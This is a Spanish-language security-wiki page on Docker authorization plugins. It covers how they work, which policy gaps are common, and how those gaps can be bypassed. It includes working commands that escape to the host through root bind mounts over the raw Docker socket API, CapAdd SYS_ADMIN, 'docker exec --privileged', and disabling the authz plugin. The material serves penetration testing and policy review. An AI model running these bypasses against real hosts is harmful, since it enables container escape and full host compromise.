# Plugins de autorización en tiempo de ejecución

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los plugins de autorización en tiempo de ejecución son una capa de política adicional que decide si un solicitante puede realizar una acción determinada en el daemon. Docker es el ejemplo clásico. Por defecto, cualquiera que pueda comunicarse con el daemon de Docker efectivamente tiene un control amplio sobre este. Los plugins de autorización intentan limitar ese modelo examinando al usuario autenticado y la operación de la API solicitada, y luego permiten o deniegan la solicitud según la política.

Este tema merece su propia página porque cambia el modelo de explotación cuando un atacante ya tiene acceso a una API de Docker o a un usuario en el grupo `docker`. En tales entornos la pregunta ya no es solo "¿puedo alcanzar el daemon?" sino también "¿está el daemon protegido por una capa de autorización, y si es así, puede esa capa ser eludida mediante endpoints no gestionados, un parsing JSON débil o permisos de gestión de plugins?"

## Funcionamiento

Cuando una solicitud llega al demonio de Docker, el subsistema de autorización puede pasar el contexto de la solicitud a uno o más plugins instalados. El plugin ve la identidad del usuario autenticado, los detalles de la solicitud, encabezados seleccionados y partes del cuerpo de la solicitud o la respuesta cuando el tipo de contenido es adecuado. Varios plugins pueden encadenarse, y el acceso se concede solo si todos los plugins permiten la solicitud.

Este modelo suena robusto, pero su seguridad depende totalmente de cuánto comprendió el autor de la política la API. Un plugin que bloquee `docker run --privileged` pero ignore `docker exec`, pase por alto claves JSON alternativas como el campo superior `Binds`, o permita la administración de plugins puede crear una falsa sensación de restricción mientras aún deja abiertos caminos directos de escalada de privilegios.

## Objetivos comunes de los plugins

Áreas importantes para revisar en la política son:

- endpoints de creación de contenedores
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` y opciones de compartición de namespaces
- comportamiento de `docker exec`
- endpoints de gestión de plugins
- cualquier endpoint que pueda desencadenar indirectamente acciones en tiempo de ejecución fuera del modelo de política previsto

Históricamente, ejemplos como el plugin `authz` de Twistlock y plugins educativos simples como `authobot` facilitaron el estudio de este modelo porque sus archivos de política y rutas de código mostraban cómo se implementaba realmente el mapeo de endpoint a acción. Para trabajos de evaluación, la lección importante es que el autor de la política debe comprender toda la superficie de la API y no solo los comandos CLI más visibles.

## Abuso

El primer objetivo es averiguar qué está realmente bloqueado. Si el daemon deniega una acción, el error a menudo leaks el nombre del plugin, lo que ayuda a identificar el control en uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si necesitas un perfilado más amplio de endpoints, herramientas como `docker_auth_profiler` son útiles porque automatizan la tarea, de otro modo repetitiva, de comprobar qué rutas de la API y qué estructuras JSON están realmente permitidas por el plugin.

Si el entorno usa un plugin personalizado y puedes interactuar con la API, enumera qué campos de los objetos están realmente filtrados:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Estas comprobaciones son importantes porque muchos fallos de autorización dependen de campos específicos en vez de ser específicos del concepto. Un plugin puede rechazar un patrón de CLI sin bloquear completamente la estructura API equivalente.

### Ejemplo completo: `docker exec` añade privilegios después de la creación del contenedor

Una política que bloquea la creación de contenedores privilegiados pero permite la creación de contenedores sin confinamiento más `docker exec` aún puede ser eludida:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si el daemon acepta el segundo paso, el usuario ha recuperado un proceso interactivo privilegiado dentro de un container que el autor de la política creía restringido.

### Ejemplo completo: Bind Mount Through Raw API

Algunas políticas defectuosas inspeccionan solo una forma JSON. Si el bind mount del sistema de archivos raíz no se bloquea de forma consistente, el host aún puede montarse:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La misma idea también puede aparecer bajo `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
El impacto es un escape completo del sistema de archivos del host. El detalle interesante es que el bypass proviene de una cobertura de políticas incompleta en lugar de un error del kernel.

### Ejemplo completo: Atributo capability sin comprobar

Si la política olvida filtrar un atributo relacionado con capability, el atacante puede crear un container que recupere una capability peligrosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una vez que `CAP_SYS_ADMIN` o una capability igualmente potente esté presente, muchas breakout techniques descritas en [capabilities.md](protections/capabilities.md) y [privileged-containers.md](privileged-containers.md) se vuelven alcanzables.

### Ejemplo completo: Deshabilitar el plugin

Si las operaciones de plugin-management están permitidas, la forma más limpia de bypass puede ser apagar el control por completo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Esto es una falla de política a nivel del control-plane. La capa de autorización existe, pero el usuario al que se suponía debía restringir aún conserva permiso para desactivarla.

## Comprobaciones

Estos comandos están destinados a identificar si existe una capa de política y si parece ser completa o superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Lo interesante aquí:

- Mensajes de denegación que incluyen el nombre de un plugin confirman una capa de autorización y a menudo revelan la implementación exacta.
- Una lista de plugins visible para el atacante puede ser suficiente para descubrir si las operaciones de deshabilitar o reconfigurar son posibles.
- Una política que bloquea solo acciones obvias desde la CLI pero no las solicitudes API en bruto debe considerarse evadible hasta que se demuestre lo contrario.

## Valores predeterminados en tiempo de ejecución

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | No habilitado por defecto | El acceso al daemon es efectivamente todo o nada a menos que se configure un plugin de autorización | política de plugins incompleta, listas negras en lugar de listas blancas, permitir la gestión de plugins, puntos ciegos a nivel de campo |
| Podman | No es un equivalente directo común | Podman típicamente se apoya más en permisos Unix, ejecución rootless y decisiones sobre exposición de API que en Docker-style authz plugins | exponer una API de Podman con privilegios root de forma amplia, permisos de socket débiles |
| containerd / CRI-O | Modelo de control diferente | Estos runtimes suelen depender de permisos de socket, límites de confianza del nodo y controles del orquestador en capas superiores en lugar de Docker authz plugins | montar el socket en las cargas de trabajo, supuestos de confianza local del nodo débiles |
| Kubernetes | Usa authn/authz en las capas API-server y kubelet, no Docker authz plugins | RBAC del clúster y controles de admisión son la capa principal de política | RBAC demasiado amplio, políticas de admisión débiles, exponer kubelet o runtime APIs directamente |
{{#include ../../../banners/hacktricks-training.md}}
